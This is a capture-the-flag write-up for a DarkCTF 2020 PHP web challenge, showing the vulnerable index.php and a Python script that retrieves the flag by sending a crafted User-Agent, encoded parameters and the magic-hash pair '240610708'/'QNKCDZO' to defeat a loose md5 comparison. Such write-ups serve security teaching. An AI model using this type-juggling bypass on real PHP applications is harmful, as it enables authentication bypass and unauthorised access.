```
Description
Let's test your php knowledge.
Author : SaltanatNaibi
```
------------------------------------------------------------------
1. Open the link, tthe web page displays the source code for 'index.php' 
   It also incude the file "flag.php" 
   which I guess has the variables : 
                                   $flag
                                   $flag1
                                   $flag2
                                   $fla3

```
<?php

include "flag.php";

echo show_source("index.php");


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['darkctf'])){
        $darkctf = $res['darkctf'];
    }
}

if ($darkctf === "2020"){
    echo "<h1 style='color: chartreuse;'>Flag : $flag</h1></br>";
}

if ($_SERVER["HTTP_USER_AGENT"] === base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==")){
    echo "<h1 style='color: chartreuse;'>Flag : $flag_1</h1></br>";
}


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['ctf2020'])){
        $ctf2020 = $res['ctf2020'];
    }
    if ($ctf2020 === base64_encode("ZGFya2N0Zi0yMDIwLXdlYg==")){
        echo "<h1 style='color: chartreuse;'>Flag : $flag_2</h1></br>";
                
        }
    }



    if (isset($_GET['karma']) and isset($_GET['2020'])) {
        if ($_GET['karma'] != $_GET['2020'])
        if (md5($_GET['karma']) == md5($_GET['2020']))
            echo "<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>";
        else
            echo "<h1 style='color: chartreuse;'>Wrong</h1></br>";
    }

?> 
```
-----------------------------------------------------------------------------------
2. In order to get all parts of the flag I need to satisfy all conditions which are
      
     ```
     i). if ($darkctf === "2020")    [$flag]
     
     ii). ($_SERVER["HTTP_USER_AGENT"] === base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ=="))   [$flag1]
     
     iii). ($ctf2020 === base64_encode("ZGFya2N0Zi0yMDIwLXdlYg=="))  [$flag2]
     
     iv). if ($_GET['karma'] != $_GET['2020'])
           if (md5($_GET['karma']) == md5($_GET['2020']))    [$flag3]
     
     ````
     
3. I wrote a python script to set all the parameters as required  'flag_get.py':

```
#!/usr/bin/python3

import requests
import re

url = 'http://php.darkarmy.xyz:7001/'

header={'User-Agent':'2020_the_best_year_corona'}

data = {'darkctf':'2020','ctf2020':'WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09','karma':'240610708','2020':'QNKCDZO'}

r = requests.get(url, params=data, headers=header)

print(r.text)
```

$ ./flag_get.py | grep 'Flag :' 
$ </code>1<h4 style='color: chartreuse;'>Flag : DarkCTF{</h4></br>
  <h4 style='color: chartreuse;'>Flag : very_</h4></br>
  <h4 style='color: chartreuse;'>Flag : nice</h4></br>
  <h4 style='color: chartreuse;'>Flag : _web_challenge_dark_ctf}</h4></br></body>

`
flag : DarkCTF{very_nice_web_challenge_dark_ctf}
`
